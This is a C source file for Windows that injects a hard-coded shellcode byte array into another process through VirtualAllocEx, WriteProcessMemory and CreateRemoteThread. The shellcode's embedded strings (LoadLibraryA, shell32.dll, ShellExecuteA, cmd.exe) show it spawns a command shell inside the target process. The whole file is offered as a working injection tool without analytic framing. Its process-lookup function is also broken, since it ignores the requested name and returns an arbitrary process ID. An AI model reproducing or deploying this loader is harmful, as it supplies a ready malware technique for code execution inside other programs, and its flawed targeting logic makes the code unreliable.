#define _CRT_SECURE_NO_WARNINGS
#include<Windows.h>
#include<stdio.h>
#include<TlHelp32.h>
DWORD Getprocess_PID_by_name(LPCSTR pname)
{

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		wprintf(L"CreateToolhelp32Snapshot Error. (%d)\n", GetLastError());
		return 0;
	}
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	BOOL bProcessRet = Process32First(hProcessSnap, &pe32);
	while (bProcessRet)
	{
		//wprintf(L"PID:%d %s\n", pe32.th32ProcessID, pe32.szExeFile);
		DWORD dwpid = pe32.th32ProcessID;
		MODULEENTRY32 me32 = { 0 };

		me32.dwSize = sizeof(MODULEENTRY32);
		HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwpid);

		if (hModuleSnap == INVALID_HANDLE_VALUE)
		{
			//wprintf(L"\t Cannot get modules. (%d) \n", GetLastError());
		}
		else
		{
			BOOL bModuleRet = Module32First(hModuleSnap, &me32);
			while (bModuleRet)
			{
				//wprintf(L"\t%s (%s)\n", me32.szModule, me32.szExePath);
				bModuleRet = Module32Next(hModuleSnap, &me32);
			}
		}
		bProcessRet = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return pe32.th32ProcessID;
}
char shell_code[] = { '\x55','\x8B','\xEC','\x83','\xEC','\x2C','\x8B','\x4D','\x08','\x8D','\x55','\xD4','\xC7','\x45','\xD4','\x4C','\x6F','\x61','\x64','\xC7','\x45','\xD8','\x4C','\x69','\x62','\x72','\xC7','\x45','\xDC','\x61','\x72','\x79','\x41','\xC6','\x45','\xE0','\x00','\xE8','\x86','\x00','\x00','\x00','\x85','\xC0','\x75','\x09','\x83','\xC8','\xFF','\x8B','\xE5','\x5D','\xC2','\x08','\x00','\x8D','\x4D','\xE4','\xC7','\x45','\xE4','\x73','\x68','\x65','\x6C','\x51','\xC7','\x45','\xE8','\x6C','\x33','\x32','\x2E','\xC7','\x45','\xEC','\x64','\x6C','\x6C','\x00','\xC7','\x45','\xD4','\x53','\x68','\x65','\x6C','\xC7','\x45','\xD8','\x6C','\x45','\x78','\x65','\xC7','\x45','\xDC','\x63','\x75','\x74','\x65','\x66','\xC7','\x45','\xE0','\x41','\x00','\xC7','\x45','\xF8','\x6F','\x70','\x65','\x6E','\xC6','\x45','\xFC','\x00','\xC7','\x45','\xF0','\x63','\x6D','\x64','\x2E','\xC7','\x45','\xF4','\x65','\x78','\x65','\x00','\xFF','\xD0','\x6A','\x00','\x6A','\x00','\xFF','\x75','\x0C','\x8D','\x4D','\xF0','\x51','\x8D','\x4D','\xF8','\x51','\x6A','\x00','\x8D','\x55','\xD4','\x8B','\xC8','\xE8','\x0F','\x00','\x00','\x00','\xFF','\xD0','\x33','\xC0','\x8B','\xE5','\x5D','\xC2','\x08','\x00','\xCC','\xCC','\xCC','\xCC','\xCC','\x55','\x8B','\xEC','\x83','\xEC','\x1C','\x53','\x8B','\xD9','\x89','\x55','\xFC','\x56','\x57','\x8B','\x43','\x3C','\x8B','\x44','\x18','\x78','\x8B','\x4C','\x18','\x1C','\x8B','\x74','\x18','\x20','\x03','\xCB','\x8B','\x7C','\x18','\x18','\x03','\xF3','\x89','\x4D','\xF4','\x8B','\x4C','\x18','\x24','\x8B','\x44','\x18','\x14','\x03','\xCB','\x89','\x75','\xF0','\x33','\xF6','\x89','\x4D','\xE8','\x89','\x7D','\xEC','\x89','\x45','\xF8','\x85','\xFF','\x74','\x52','\x3B','\xF7','\x73','\x4E','\x0F','\xBF','\x04','\x71','\x3B','\x45','\xF8','\x73','\x45','\x8B','\x4D','\xF4','\x8B','\x7D','\xFC','\x8B','\x04','\x81','\x89','\x45','\xE4','\x8B','\x45','\xF0','\x8B','\x04','\xB0','\x03','\xC3','\x8A','\x08','\x3A','\x0F','\x8B','\x7D','\xEC','\x75','\x0F','\x66','\x90','\x84','\xC9','\x74','\x16','\x8A','\x48','\x01','\x40','\x42','\x3A','\x0A','\x74','\xF3','\x46','\x3B','\xF7','\x73','\x14','\x8B','\x55','\xFC','\x8B','\x4D','\xE8','\xEB','\xBA','\x8B','\x45','\xE4','\x5F','\x5E','\x03','\xC3','\x5B','\x8B','\xE5','\x5D','\xC3','\x5F','\x5E','\x33','\xC0','\x5B','\x8B','\xE5','\x5D','\xC3','\xCC','\x00' };

int main(int argc, char* argv[])
{
	
		DWORD dwProcessID = Getprocess_PID_by_name("notepad.exe");
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
		
		int length = sizeof(shell_code);

		//alloc memory for target process
		LPVOID pDllAddr = VirtualAllocEx(hProcess, NULL, length, MEM_RESERVE |MEM_COMMIT,PAGE_EXECUTE_READWRITE);

		//inject dll to target process
		SIZE_T dwWriteNum = 0;
		WriteProcessMemory(hProcess, pDllAddr, shell_code, length, &dwWriteNum);

		//get function address
		
		HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pDllAddr,NULL, 0, NULL);
		WaitForSingleObject(hRemoteThread, INFINITE);

		CloseHandle(hRemoteThread);
		CloseHandle(hProcess);

	
}

